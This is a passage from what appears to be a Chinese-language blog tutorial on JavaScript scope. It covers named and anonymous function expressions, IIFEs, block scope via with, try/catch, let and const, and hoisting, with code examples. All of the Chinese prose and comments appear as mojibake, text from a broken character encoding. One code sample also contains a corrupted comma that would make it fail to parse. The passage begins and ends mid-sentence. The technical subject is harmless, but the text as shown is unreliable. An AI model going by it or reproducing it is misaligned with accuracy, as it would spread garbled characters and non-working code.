å…³é”®å­—å‡ºç°åœ¨å£°æ˜ä¸­çš„ä½ç½®(ä¸ä»…ä»…æ˜¯ä¸€è¡Œä»£ç ï¼Œè€Œæ˜¯æ•´ä¸ªå£°æ˜ä¸­çš„ä½ç½®)ã€‚å¦‚æœ function æ˜¯å£°æ˜ä¸­çš„ç¬¬ä¸€ä¸ªè¯ï¼Œé‚£ä¹ˆå°±æ˜¯ä¸€ä¸ªå‡½æ•°å£°æ˜ï¼Œå¦åˆ™å°±æ˜¯ä¸€ä¸ªå‡½æ•°è¡¨è¾¾å¼ã€‚<strong>è¡¥å……ï¼ˆå†…åœ¨åŒºåˆ«ï¼‰ï¼š</strong> </p><ul><li>å‡½æ•°æå‡:å‡½æ•°å£°æ˜ï¼Œä¼šå°†æ•´ä¸ªå‡½æ•°è¿›è¡Œæå‡ï¼›è€Œå‡½æ•°è¡¨è¾¾å¼åˆ™ä¸ä¼šæå‡ï¼Œå®ƒæ˜¯åœ¨å¼•æ“è¿è¡Œæ—¶è¿›è¡Œèµ‹å€¼ï¼Œä¸”è¦ç­‰åˆ°è¡¨è¾¾å¼èµ‹å€¼å®Œæˆåæ‰èƒ½è°ƒç”¨ã€‚ </li><li>å‡½æ•°è¡¨è¾¾å¼æ˜¯å¯ä»¥æ²¡æœ‰å‡½æ•°åçš„ï¼Œå¦‚æœæœ‰ï¼Œå®ƒçš„å‡½æ•°åä¹Ÿåªå­˜åœ¨äºè‡ªèº«çš„ä½œç”¨åŸŸï¼Œ<code>var f = function fun()&#123;console.log(fun)&#125;</code>å…¶ä»–åœ°æ–¹æ˜¯æ²¡æœ‰çš„ã€‚è¿™ä¹Ÿé¿å…äº†å…¨å±€æ±¡æŸ“ï¼Œä¹Ÿæ–¹ä¾¿é€’å½’ã€‚</li></ul><h4 id="3-3-1-åŒ¿åå’Œå…·å"><a href="#3-3-1-åŒ¿åå’Œå…·å" class="headerlink" title="3.3.1 åŒ¿åå’Œå…·å"></a>3.3.1 åŒ¿åå’Œå…·å</h4><p>å‡½æ•°è¡¨è¾¾å¼å¯ä»¥æ˜¯åŒ¿åçš„ï¼Œè€Œå‡½æ•°å£°æ˜åˆ™ä¸å¯ä»¥çœç•¥å‡½æ•°åã€‚åŒ¿åå‡½æ•°çš„ç¼ºç‚¹:</p><ul><li>åŒ¿åå‡½æ•°åœ¨æ ˆè¿½è¸ªä¸­ä¸ä¼šæ˜¾ç¤ºå‡ºæœ‰æ„ä¹‰çš„å‡½æ•°åï¼Œä½¿å¾—è°ƒè¯•å¾ˆå›°éš¾ã€‚</li><li>å¦‚æœæ²¡æœ‰å‡½æ•°åï¼Œå½“å‡½æ•°éœ€è¦å¼•ç”¨è‡ªèº«æ—¶åªèƒ½ä½¿ç”¨å·²ç»è¿‡æœŸçš„arguments.calleeå¼•ç”¨ï¼Œæ¯”å¦‚åœ¨é€’å½’ä¸­ã€‚å¦ä¸€ä¸ªå‡½æ•°éœ€è¦å¼•ç”¨è‡ªèº«çš„ä¾‹å­ï¼Œæ˜¯åœ¨äº‹ä»¶è§¦å‘åäº‹ä»¶ç›‘å¬å™¨éœ€è¦è§£ç»‘è‡ªèº«ã€‚</li><li>åŒ¿åå‡½æ•°çœç•¥äº†å¯¹äºä»£ç å¯è¯»æ€§/å¯ç†è§£æ€§å¾ˆé‡è¦çš„å‡½æ•°åã€‚ä¸€ä¸ªæè¿°æ€§çš„åç§°å¯ä»¥è®©ä»£ç ä¸è¨€è‡ªæ˜ã€‚</li></ul><h4 id="3-3-2-ç«‹å³æ‰§è¡Œå‡½æ•°è¡¨è¾¾å¼"><a href="#3-3-2-ç«‹å³æ‰§è¡Œå‡½æ•°è¡¨è¾¾å¼" class="headerlink" title="3.3.2 ç«‹å³æ‰§è¡Œå‡½æ•°è¡¨è¾¾å¼"></a>3.3.2 ç«‹å³æ‰§è¡Œå‡½æ•°è¡¨è¾¾å¼</h4><p>æ¯”å¦‚ (function foo(){ .. })()ã€‚ç¬¬ä¸€ä¸ª ( ) å°†å‡½æ•°å˜æˆè¡¨è¾¾å¼ï¼Œç¬¬äºŒä¸ª ( ) æ‰§è¡Œäº†è¿™ä¸ªå‡½æ•°ã€‚è¿™å°±æ˜¯ç«‹å³æ‰§è¡Œå‡½æ•°è¡¨è¾¾å¼ï¼Œä¹Ÿè¢«ç§°ä¸ºIIFEï¼Œä»£è¡¨<strong>ç«‹å³æ‰§è¡Œå‡½æ•°è¡¨è¾¾å¼</strong> (Immediately Invoked Function Expression);</p><p>IIFEå¯ä»¥å…·åä¹Ÿå¯ä»¥åŒ¿åï¼Œå¥½å¤„å’Œä¸Šé¢æåˆ°çš„ä¸€æ ·ã€‚IIFEè¿˜å¯ä»¥æ˜¯è¿™ç§å½¢å¼<code>(function()&#123; .. &#125;())</code>.è¿™ä¸¤ç§å½¢å¼åœ¨åŠŸèƒ½ä¸Šæ˜¯ä¸€è‡´çš„ã€‚</p><h3 id="3-4-å—ä½œç”¨åŸŸ"><a href="#3-4-å—ä½œç”¨åŸŸ" class="headerlink" title="3.4 å—ä½œç”¨åŸŸ"></a>3.4 å—ä½œç”¨åŸŸ</h3><p>å‡½æ•°ä½œç”¨åŸŸæ˜¯JavaScriptæœ€å¸¸è§çš„ä½œç”¨åŸŸå•å…ƒï¼Œæœ‰æ—¶æˆ‘ä»¬ä»…ä¼šå°†varèµ‹å€¼å˜é‡åœ¨ifæˆ–forçš„{â€¦}å†…ä½¿ç”¨ï¼Œè€Œä¸ä¼šåœ¨å…¶ä»–åœ°æ–¹ä½¿ç”¨ã€‚ä½†å®ƒä»ç„¶ä¼šå¯¹å¤–å±‚çš„å‡½æ•°ä½œç”¨åŸŸé€ æˆæ±¡æŸ“ï¼Œè¿™ä¸ªæ—¶å€™å°±ä¼šå¸Œæœ›èƒ½æœ‰ä¸€ä¸ªä½œç”¨åŸŸèƒ½å°†å…¶å¤–éƒ¨çš„å‡½æ•°ä½œç”¨åŸŸéš”å¼€ï¼Œå£°æ˜çš„å˜é‡ä»…åœ¨æ­¤ä½œç”¨åŸŸæœ‰æ•ˆã€‚å—ä½œç”¨åŸŸ(é€šå¸¸å°±æ˜¯{â€¦}åŒ…è£¹çš„å†…éƒ¨)å°±å¯ä»¥å¸®æˆ‘ä»¬åšåˆ°è¿™ç‚¹ã€‚</p><h4 id="3-4-1-with"><a href="#3-4-1-with" class="headerlink" title="3.4.1 with"></a>3.4.1 with</h4><p> with ä¸ä»…æ˜¯ä¸€ä¸ªéš¾äºç†è§£çš„ç»“æ„ï¼ŒåŒæ—¶ä¹Ÿæ˜¯å—ä½œç”¨åŸŸçš„ä¸€ä¸ªä¾‹å­(å—ä½œç”¨åŸŸçš„ä¸€ç§å½¢å¼)ï¼Œç”¨ with ä»å¯¹è±¡ä¸­åˆ›å»ºå‡ºçš„ä½œç”¨åŸŸä»…åœ¨ with å£°æ˜ä¸­è€Œéå¤–éƒ¨ä½œç”¨åŸŸä¸­æœ‰æ•ˆã€‚</p><h4 id="3-4-2-try-catch"><a href="#3-4-2-try-catch" class="headerlink" title="3.4.2 try/catch"></a>3.4.2 try/catch</h4><p>try/catch çš„ catch åˆ†å¥ä¼šåˆ›å»ºä¸€ä¸ªå—ä½œç”¨åŸŸï¼Œå…¶ä¸­å£°æ˜çš„å˜é‡ä»…åœ¨ catch å†…éƒ¨æœ‰æ•ˆã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="literal">undefined</span>(); <span class="comment">// æ‰§è¡Œä¸€ä¸ªéæ³•æ“ä½œæ¥å¼ºåˆ¶åˆ¶é€ ä¸€ä¸ªå¼‚å¸¸</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (err) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log( err ); <span class="comment">// èƒ½å¤Ÿæ­£å¸¸æ‰§è¡Œ! </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log( err ); <span class="comment">// ReferenceError: err not found</span></span><br></pre></td></tr></table></figure><p>err ä»…å­˜åœ¨ catch åˆ†å¥å†…éƒ¨ï¼Œå½“è¯•å›¾ä»åˆ«å¤„å¼•ç”¨å®ƒæ—¶ä¼šæŠ›å‡ºé”™è¯¯ã€‚<br>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬æƒ³ç”¨catchåˆ›å»ºä¸€ä¸ªä¸æ˜¯ä»…ä»…æ¥æ”¶errçš„å—ä½œç”¨åŸŸï¼Œè¯¥æ€ä¹ˆåšå‘¢ï¼Ÿ</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;<span class="keyword">throw</span> <span class="number">2</span>;&#125;<span class="keyword">catch</span>(a)&#123; </span><br><span class="line">  <span class="built_in">console</span>.log( a ); <span class="comment">// 2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log( a ); <span class="comment">// ReferenceError</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±åˆ›å»ºäº†ä¸€ä¸ªå—ä½œç”¨åŸŸï¼Œä¸”a=2ï¼Œä»…åœ¨catchåˆ†å¥ä¸­å­˜åœ¨ã€‚åœ¨ES6ä¹‹å‰æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ç§æ–¹æ³•æ¥ä½¿ç”¨å—ä½œç”¨åŸŸã€‚</p><h4 id="3-4-3-let"><a href="#3-4-3-let" class="headerlink" title="3.4.3 let"></a>3.4.3 let</h4><p>ES6 å¼•å…¥äº†æ–°çš„ let å…³é”®å­—ï¼Œæä¾›äº†é™¤ var ä»¥å¤–çš„å¦ä¸€ç§å˜é‡å£°æ˜æ–¹å¼ã€‚let å…³é”®å­—å¯ä»¥å°†å˜é‡ç»‘å®šåˆ°æ‰€åœ¨çš„ä»»æ„ä½œç”¨åŸŸä¸­(é€šå¸¸æ˜¯ { .. } å†…éƒ¨)ã€‚</p><p>ç”¨ let å°†å˜é‡é™„åŠ åœ¨ä¸€ä¸ªå·²ç»å­˜åœ¨çš„å—ä½œç”¨åŸŸä¸Šçš„è¡Œä¸ºæ˜¯éšå¼çš„ï¼Œä¾‹å¦‚åœ¨ifçš„{â€¦}å†…ç”¨letå£°æ˜ä¸€ä¸ªå˜é‡ã€‚é‚£ä»€ä¹ˆæ˜¯<strong>æ˜¾å¼åœ°åˆ›å»ºå—ä½œç”¨åŸŸ</strong>å‘¢ï¼Ÿå°±æ˜¯å•ç‹¬åˆ›å»º<code>&#123;&#125;</code>æ¥ä½œä¸ºletçš„å—ä½œç”¨åŸŸ.è€Œä¸æ˜¯å€Ÿç”¨ifæˆ–è€…foræä¾›çš„<code>&#123;&#125;</code>ã€‚ä¾‹å¦‚:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="keyword">let</span> a=<span class="number">2</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„:</strong> ä½¿ç”¨ let è¿›è¡Œçš„å£°æ˜ä¸ä¼šåœ¨å—ä½œç”¨åŸŸä¸­è¿›è¡Œæå‡ã€‚ </p><p><strong>å—ä½œç”¨åŸŸçš„å¥½å¤„:</strong></p><ul><li>åƒåœ¾æ”¶é›†</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// åœ¨è¿™é‡Œåšç‚¹æœ‰è¶£çš„äº‹æƒ…</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> someReallyBigData=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//dosomeing</span></span><br><span class="line">&#125;</span><br><span class="line">process(someReallyBigData);</span><br><span class="line"><span class="keyword">var</span> btn=<span class="built_in">document</span>.getElementById(<span class="string">&quot;my_button&quot;</span>);</span><br><span class="line">btn.addEventListener(<span class="string">&quot;click&quot;</span>ï¼Œ<span class="function"><span class="keyword">function</span> <span class="title">click</span>(<span class="params">evt</span>)</span>&#123;</span><br><span class="line">    alert(<span class="string">&quot;button click&quot;</span>);</span><br><span class="line">    <span class="comment">//å‡å¦‚æˆ‘ä»¬åœ¨è¿™é‡Œç»§ç»­è°ƒç”¨someReallyBigDataå°±ä¼šå½¢æˆé—­åŒ…ï¼Œå¯¼è‡´ä¸èƒ½åƒåœ¾å›æ”¶</span></span><br><span class="line">&#125;ï¼Œ<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>click å‡½æ•°çš„ç‚¹å‡»å›è°ƒå¹¶ä¸éœ€è¦ someReallyBigData å˜é‡ã€‚ç†è®ºä¸Šè¿™æ„å‘³ç€å½“ process(..) æ‰§è¡Œåï¼Œåœ¨å†…å­˜ä¸­å ç”¨å¤§é‡ç©ºé—´çš„æ•°æ®ç»“æ„å°±å¯ä»¥è¢«åƒåœ¾å›æ”¶äº†ã€‚ä½†æ˜¯ï¼Œç”±äº click å‡½æ•°å½¢æˆäº†ä¸€ä¸ªè¦†ç›–æ•´ä¸ªä½œç”¨åŸŸçš„é—­åŒ…ï¼ŒJavaScript å¼•æ“ææœ‰å¯èƒ½ä¾ç„¶ä¿å­˜ç€è¿™ä¸ªç»“æ„(å–å†³äºå…·ä½“å®ç°)ã€‚<br>ä½†æ˜¾å¼ä½¿ç”¨å—ä½œç”¨åŸŸå¯ä»¥è®©å¼•æ“æ¸…æ¥šåœ°çŸ¥é“æ²¡æœ‰å¿…è¦ç»§ç»­ä¿å­˜ someReallyBigData äº†:</p> <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// åœ¨è¿™é‡Œåšç‚¹æœ‰è¶£çš„äº‹æƒ…</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// åœ¨è¿™ä¸ªå—ä¸­å®šä¹‰çš„å†…å®¹å¯ä»¥é”€æ¯äº†ï¼</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> someReallyBigData = &#123; .. &#125;;</span><br><span class="line">    process( someReallyBigData );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById( <span class="string">&quot;my_button&quot;</span> );</span><br><span class="line">btn.addEventListener( <span class="string">&quot;click&quot;</span>, <span class="function"><span class="keyword">function</span> <span class="title">click</span>(<span class="params">evt</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;button clicked&quot;</span>);</span><br><span class="line">&#125;,<span class="literal">false</span> );</span><br></pre></td></tr></table></figure><ul><li>letå¾ªç¯</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++) &#123; </span><br><span class="line"> <span class="built_in">console</span>.log( i );</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log( i ); <span class="comment">// ReferenceError</span></span><br></pre></td></tr></table></figure><p>for å¾ªç¯å¤´éƒ¨çš„ let ä¸ä»…å°† i ç»‘å®šåˆ°äº† for å¾ªç¯çš„å—ä¸­ï¼Œäº‹å®ä¸Šå®ƒå°†å…¶é‡æ–°ç»‘å®šåˆ°äº†å¾ªç¯çš„æ¯ä¸€ä¸ªè¿­ä»£ä¸­ï¼Œç¡®ä¿ä½¿ç”¨ä¸Šä¸€ä¸ªå¾ªç¯è¿­ä»£ç»“æŸæ—¶çš„å€¼é‡æ–°è¿›è¡Œèµ‹å€¼ã€‚è¿™æ ·å°±é¿å…äº†iå¯¹å¤–éƒ¨å‡½æ•°ä½œç”¨åŸŸçš„æ±¡æŸ“ã€‚</p><h4 id="3-4-4-const"><a href="#3-4-4-const" class="headerlink" title="3.4.4 const"></a>3.4.4 const</h4><p>é™¤äº† let ä»¥å¤–ï¼ŒES6 è¿˜å¼•å…¥äº† constï¼ŒåŒæ ·å¯ä»¥ç”¨æ¥åˆ›å»ºå—ä½œç”¨åŸŸå˜é‡ï¼Œä½†å…¶å€¼æ˜¯å›ºå®šçš„(å¸¸é‡)ã€‚ä¹‹åä»»ä½•è¯•å›¾ä¿®æ”¹å€¼çš„æ“ä½œéƒ½ä¼šå¼•èµ·é”™è¯¯ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span> (foo) &#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">const</span> b = <span class="number">3</span>; <span class="comment">// åŒ…å«åœ¨ if ä¸­çš„å—ä½œç”¨åŸŸå¸¸é‡</span></span><br><span class="line">  a = <span class="number">3</span>; <span class="comment">// æ­£å¸¸!</span></span><br><span class="line">  b = <span class="number">4</span>; <span class="comment">// é”™è¯¯! </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log( a ); <span class="comment">// 3</span></span><br><span class="line"><span class="built_in">console</span>.log( b ); <span class="comment">// ReferenceError!</span></span><br></pre></td></tr></table></figure><h3 id="3-5-å°ç»“"><a href="#3-5-å°ç»“" class="headerlink" title="3.5 å°ç»“"></a>3.5 å°ç»“</h3><p>å‡½æ•°æ˜¯ JavaScript ä¸­æœ€å¸¸è§çš„ä½œç”¨åŸŸå•å…ƒã€‚æœ¬è´¨ä¸Šï¼Œå£°æ˜åœ¨ä¸€ä¸ªå‡½æ•°å†…éƒ¨çš„å˜é‡æˆ–å‡½æ•°ä¼šåœ¨æ‰€å¤„çš„ä½œç”¨åŸŸä¸­â€œéšè—â€èµ·æ¥ï¼Œå¯ä»¥æœ‰æ•ˆåœ°ä¸å¤–éƒ¨ä½œç”¨åŸŸéš”å¼€ã€‚</p><p>ä½†å‡½æ•°ä¸æ˜¯å”¯ä¸€çš„ä½œç”¨åŸŸå•å…ƒã€‚å—ä½œç”¨åŸŸæŒ‡çš„æ˜¯å˜é‡å’Œå‡½æ•°ä¸ä»…å¯ä»¥å±äºæ‰€å¤„çš„ä½œç”¨åŸŸï¼Œä¹Ÿå¯ä»¥å±äºæŸä¸ªä»£ç å—(é€šå¸¸æŒ‡ { .. } å†…éƒ¨)å³å—ä½œç”¨åŸŸã€‚ES6ä¸­å°±æä¾›äº†letå’Œconstæ¥å¸®åŠ©åˆ›å»ºå—ä½œç”¨åŸŸã€‚</p><h2 id="ç¬¬å››ç« -æå‡"><a href="#ç¬¬å››ç« -æå‡" class="headerlink" title="ç¬¬å››ç«  æå‡"></a>ç¬¬å››ç«  æå‡</h2><h3 id="4-1-å…ˆæœ‰é¸¡-èµ‹å€¼-è¿˜æ˜¯å…ˆæœ‰è›‹-å£°æ˜"><a href="#4-1-å…ˆæœ‰é¸¡-èµ‹å€¼-è¿˜æ˜¯å…ˆæœ‰è›‹-å£°æ˜" class="headerlink" title="4.1 å…ˆæœ‰é¸¡(èµ‹å€¼)è¿˜æ˜¯å…ˆæœ‰è›‹(å£°æ˜)"></a>4.1 å…ˆæœ‰é¸¡(èµ‹å€¼)è¿˜æ˜¯å…ˆæœ‰è›‹(å£°æ˜)</h3><p>è€ƒè™‘ç¬¬ä¸€æ®µä»£ç </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">a = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">var</span> a; </span><br><span class="line"><span class="built_in">console</span>.log( a );</span><br></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœæ˜¯2ï¼Œè€Œä¸æ˜¯undefined</p><p>è€ƒè™‘ç¬¬äºŒæ®µä»£ç </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log( a ); </span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœæ˜¯undefinedï¼Œè€Œä¸æ˜¯ReferenceError<br>è€ƒè™‘å®Œä»¥ä¸Šä»£ç ï¼Œä½ åº”è¯¥ä¼šè€ƒè™‘è¿™ä¸ªé—®é¢˜ï¼šåˆ°åº•æ˜¯å£°æ˜(è›‹)åœ¨å‰ï¼Œè¿˜æ˜¯èµ‹å€¼(é¸¡)åœ¨å‰ï¼Ÿ</p><h3 id="4-2-ç¼–è¯‘å™¨å†åº¦æ¥è¢­"><a href="#4-2-ç¼–è¯‘å™¨å†åº¦æ¥è¢­" class="headerlink" title="4.2 ç¼–è¯‘å™¨å†åº¦æ¥è¢­"></a>4.2 ç¼–è¯‘å™¨å†åº¦æ¥è¢­</h3><p>å¼•æ“ä¼šåœ¨è§£é‡Š JavaScript ä»£ç ä¹‹å‰é¦–å…ˆå¯¹å…¶è¿›è¡Œç¼–è¯‘ã€‚ç¼–è¯‘é˜¶æ®µä¸­çš„ä¸€éƒ¨åˆ†å·¥ä½œå°±æ˜¯<strong>æ‰¾åˆ°æ‰€æœ‰çš„å£°æ˜ï¼Œå¹¶ç”¨åˆé€‚çš„ä½œç”¨åŸŸå°†å®ƒä»¬å…³è”èµ·æ¥ã€‚ ä¹‹åå¼•æ“ä¼šè¯¢é—®ä½œç”¨åŸŸï¼Œå¯¹å£°æ˜è¿›è¡Œèµ‹å€¼æ“ä½œã€‚</strong></p><p>é‚£ä¹ˆï¼Œåœ¨ç¼–è¯‘é˜¶æ®µæ‰¾åˆ°æ‰€æœ‰çš„å£°æ˜åï¼Œç¼–è¯‘å™¨åˆåšäº†ä»€ä¹ˆï¼Ÿç­”æ¡ˆå°±æ˜¯<strong>æå‡</strong>ã€‚ä»¥ä¸ŠèŠ‚çš„ç¬¬ä¸€æ®µä»£ç ä¸ºä¾‹ï¼Œ<strong>å½“çœ‹åˆ° var a = 2; æ—¶ï¼Œå¯èƒ½ä¼šè®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªå£°æ˜ã€‚ä½† JavaScript å®é™…ä¸Šä¼šå°†å…¶çœ‹æˆä¸¤ä¸ªå£°æ˜:var a;å’Œa = 2;</strong> ç¬¬ä¸€ä¸ªå®šä¹‰å£°æ˜æ˜¯åœ¨ç¼–è¯‘é˜¶æ®µè¿›è¡Œçš„ï¼Œç¬¬äºŒä¸ªèµ‹å€¼å£°æ˜ä¼šè¢«ç•™åœ¨åŸåœ°ç­‰å¾…æ‰§è¡Œé˜¶æ®µã€‚åœ¨ç¬¬ä¸€ä¸ªå£°æ˜åœ¨ç¼–è¯‘é˜¶æ®µæ—¶ï¼Œç¼–è¯‘å™¨ä¼šå¯¹<code>var a;</code>å£°æ˜è¿›è¡Œæå‡(å³æŠŠ<code>var a;</code>ç½®äºæ‰€åœ¨ä½œç”¨åŸŸçš„æœ€ä¸Šé¢)ï¼›è€Œ<code>a = 2;</code>åˆ™ä¼šä¿æŒæ‰€åœ¨ä½ç½®ä¸åŠ¨ã€‚æ­¤æ—¶ä»£ç ä¼šå˜æˆ</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a; </span><br><span class="line">a = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">console</span>.log( a );</span><br></pre></td></tr></table></figure><p>ç”±æ­¤å¯çŸ¥ï¼Œ<strong>åœ¨ç¼–è¯‘é˜¶æ®µï¼Œç¼–è¯‘å™¨ä¼šå¯¹å£°æ˜è¿›è¡Œæå‡.å³å…ˆæœ‰è›‹(å£°æ˜)åæœ‰é¸¡(èµ‹å€¼)ã€‚</strong>  <strong>å“ªäº›å£°æ˜ä¼šè¢«è¿›è¡Œæå‡ï¼Ÿ</strong></p><ul><li>å˜é‡å£°æ˜:ä¾‹å¦‚ä¸Šä¾‹ä¸­çš„<code>var a;</code>.ä¸åŒ…æ‹¬åé¢çš„<code>a = 2;</code>å³<strong>ä¸åŒ…å«æœ‰èµ‹å€¼æ“ä½œçš„å£°æ˜ã€‚</strong></li><li>å‡½æ•°å£°æ˜:æ³¨æ„<strong>æ˜¯å‡½æ•°å£°æ˜,è€Œä¸æ˜¯å‡½æ•°è¡¨è¾¾å¼</strong>ï¼å‡½æ•°å£°æ˜æå‡ï¼Œæ˜¯å°†æ•´ä¸ªå‡½æ•°è¿›è¡Œæå‡ï¼Œè€Œä¸æ˜¯ä»…ä»…å‡½æ•°åçš„æå‡ã€‚</li></ul><h3 id="4-3-å‡½æ•°ä¼˜å…ˆ"><a href="#4-3-å‡½æ•°ä¼˜å…ˆ" class="headerlink" title="4.3 å‡½æ•°ä¼˜å…ˆ"></a>4.3 å‡½æ•°ä¼˜å…ˆ</h3><p>å‡½æ•°å£°æ˜å’Œå˜é‡å£°æ˜éƒ½ä¼šè¢«æå‡ï¼Œä½†æ˜¯å‡½æ•°ä¼šé¦–å…ˆè¢«æå‡ï¼Œç„¶åæ‰æ˜¯å˜é‡ã€‚<br>è€ƒè™‘ä»¥ä¸‹ä»£ç :</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">foo(); <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">var</span> foo;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="built_in">console</span>.log( <span class="number">1</span> );</span><br><span class="line">&#125;</span><br><span class="line">foo = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="built_in">console</span>.log( <span class="number">2</span> );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä¼šè¾“å‡º 1 è€Œä¸æ˜¯ 2 ï¼è¿™ä¸ªä»£ç ç‰‡æ®µä¼šè¢«å¼•æ“ç†è§£ä¸ºå¦‚ä¸‹å½¢å¼:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="built_in">console</span>.log( <span class="number">1</span> );</span><br><span class="line">&#125;</span><br><span class="line">foo(); <span class="comment">// 1</span></span><br><span class="line">foo = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="built_in">console</span>.log( <span class="number">2</span> );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œvar foo å°½ç®¡å‡ºç°åœ¨ function foo()â€¦ çš„å£°æ˜ä¹‹å‰ï¼Œä½†å®ƒæ˜¯é‡å¤çš„å£°æ˜(å› æ­¤è¢«å¿½ç•¥äº†)ï¼Œå› ä¸ºå‡½æ•°å£°æ˜ä¼šè¢«æå‡åˆ°æ™®é€šå˜é‡ä¹‹å‰ã€‚<br><strong>æ³¨æ„:</strong> jsä¼šå¿½ç•¥å‰é¢å·²ç»å£°æ˜çš„å£°æ˜(ä¸ç®¡æ˜¯å˜é‡å£°æ˜è¿˜æ˜¯å‡½æ•°å£°æ˜ï¼Œåªè¦å…¶åç§°ç›¸åŒï¼Œåˆ™åç»­ä¸ä¼šå†è¿›è¡Œé‡å¤å£°æ˜)ã€‚ä½†æ˜¯å¯¹è¯¥å˜é‡æ–°çš„èµ‹å€¼ï¼Œä¼šè¦†ç›–ä¹‹å‰çš„å€¼ã€‚<br><strong>ä¸€å¥è¯æ¦‚æ‹¬:å‡½æ•°å£°æ˜çš„ä¼˜å…ˆçº§é«˜äºå˜é‡å£°æ˜ï¼Œä¼šæ’åœ¨å®ƒå‰é¢ã€‚</strong></p><h3 id="4-4-å°ç»“"><a href="#4-4-å°ç»“" class="headerlink" title="4.4 å°ç»“"></a>4.4 å°ç»“</h3><ul><li>å¯¹äº<code>var a = 2</code>  JavaScriptå¼•æ“ä¼šå°†<code>var a</code>å’Œ <code>a = 2</code>å½“ä½œä¸¤ä¸ªå•ç‹¬çš„å£°æ˜ï¼Œç¬¬ä¸€ä¸ªæ˜¯ç¼–è¯‘é˜¶æ®µçš„ä»»åŠ¡ï¼Œè€Œç¬¬äºŒä¸ªåˆ™æ˜¯æ‰§è¡Œé˜¶æ®µçš„ä»»åŠ¡ã€‚</li><li>ä¸è®ºä½œç”¨åŸŸä¸­çš„å£°æ˜å‡ºç°åœ¨ä»€ä¹ˆåœ°æ–¹ï¼Œéƒ½å°†åœ¨ä»£ç æœ¬èº«è¢«æ‰§è¡Œå‰é¦–å…ˆè¿›è¡Œå¤„ç†ã€‚ å¯ä»¥å°†è¿™ä¸ªè¿‡ç¨‹å½¢è±¡åœ°æƒ³è±¡æˆæ‰€æœ‰çš„å£°æ˜(å˜é‡å’Œå‡½æ•°)éƒ½ä¼šè¢«â€œç§»åŠ¨â€åˆ°å„è‡ªä½œç”¨åŸŸçš„æœ€é¡¶ç«¯ï¼Œè¿™ä¸ªè¿‡ç¨‹è¢«ç§°ä¸ºæå‡ã€‚</li><li>å£°æ˜æœ¬èº«ä¼šè¢«æå‡ï¼Œè€ŒåŒ…æ‹¬å‡½æ•°è¡¨è¾¾å¼çš„èµ‹å€¼åœ¨å†…çš„èµ‹å€¼æ“ä½œå¹¶ä¸ä¼šæå‡(å³èµ‹å€¼æ“ä½œéƒ½ä¸ä¼šæå‡)ã€‚</li><li>æ³¨æ„ï¼šå½“æ™®é€šçš„ var 